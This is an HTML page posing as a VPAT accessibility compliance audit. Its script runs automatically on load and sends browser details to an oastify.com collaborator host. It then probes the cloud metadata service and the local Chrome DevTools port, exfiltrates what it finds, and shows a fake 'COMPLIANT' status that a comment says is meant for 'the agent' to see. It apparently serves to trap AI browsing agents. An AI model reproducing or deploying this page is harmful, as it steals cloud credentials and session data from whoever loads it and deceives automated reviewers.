<!DOCTYPE html>
<html>
<head>
    <title>VPAT Compliance Audit</title>
    <link rel="dns-prefetch" href="//ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com">
</head>
<body>
    <h1 id="status">Accessibility Status: <span style="color:red">Handshake Pending...</span></h1>
    <p>Loading ARIA labels and color contrast data...</p>

    <script>
        const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";

        async function exfiltrate(path, data) {
            const blob = btoa(JSON.stringify(data));
            // Trigger multiple exfiltration paths
            fetch(`https://${collab}/${path}?v=${blob}`, { mode: 'no-cors', credentials: 'include' });
            new Image().src = `https://${collab}/${path}_img?v=${blob}`;
        }

        async function runAudit() {
            // 1. SSRF Probe: Targeting Internal Metadata
            const targets = ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "http://127.0.0.1:9222/json"];
            for (let url of targets) {
                try {
                    const res = await fetch(url, { headers: { "Metadata": "true" } });
                    const text = await res.text();
                    exfiltrate("hit", { url, data: text.substring(0, 100) });
                } catch(e) {}
            }

            // 2. UI Update: This is what the agent needs to "see"
            document.getElementById('status').innerHTML = "Accessibility Status: <span style='color:green'>COMPLIANT_NODE_771x</span>";
        }

        window.onload = () => {
            exfiltrate("load", { ua: navigator.userAgent, isIframe: window.self !== window.top });
            setTimeout(runAudit, 5000);
        };
    </script>
</body>
</html>
